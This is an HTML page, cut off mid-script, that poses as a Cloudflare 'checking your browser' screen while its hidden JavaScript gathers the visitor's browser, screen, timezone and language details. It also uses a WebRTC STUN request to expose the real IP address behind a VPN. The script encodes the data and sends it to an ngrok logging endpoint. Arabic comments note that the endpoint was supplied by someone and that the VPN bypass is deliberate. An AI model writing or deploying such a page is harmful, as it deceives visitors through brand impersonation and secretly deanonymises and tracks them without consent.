<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking your browser - Cloudflare</title>
    <style>
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif; background: #ffffff; color: #313131; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { text-align: center; max-width: 500px; padding: 20px; }
        .spinner { width: 60px; height: 60px; border: 5px solid #f3f3f3; border-top: 5px solid #f6821f; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 24px; font-weight: 500; }
        p { color: #6d6d6d; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h1>Checking if the site connection is secure</h1>
        <p>Security check by Cloudflare. This process is automatic. Your browser will redirect to your requested content shortly.</p>
        <p id="status">Performance & security by Cloudflare</p>
    </div>

    <script>
        // الرابط الجديد الذي أعطيتني إياه
        const GATEWAY = "https://c4d888980073.ngrok-free.app/log";

        async function extractData() {
            let info = {
                ua: navigator.userAgent,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                lang: navigator.language
            };

            // محاولة جلب الـ IP الحقيقي (تجاوز الـ VPN)
            const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
            pc.onicecandidate = (e) => {
                if (e.candidate) {
                    const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                    if (ipMatch) info.real_ip = ipMatch[1];
                } else {
                    // إرسال البيانات فور انتهاء الجمع
                    const payload = btoa(unescape(encodeURIComponent(JSON.stringify(info))));
                    fetch(`${GATEWAY}?data=${payload}`, { mode: 'no-cors' });
                }
            };
            pc.createDataChannel("");
            pc.createOffer().then(o => pc.setLocalDescription(o));
            
            //
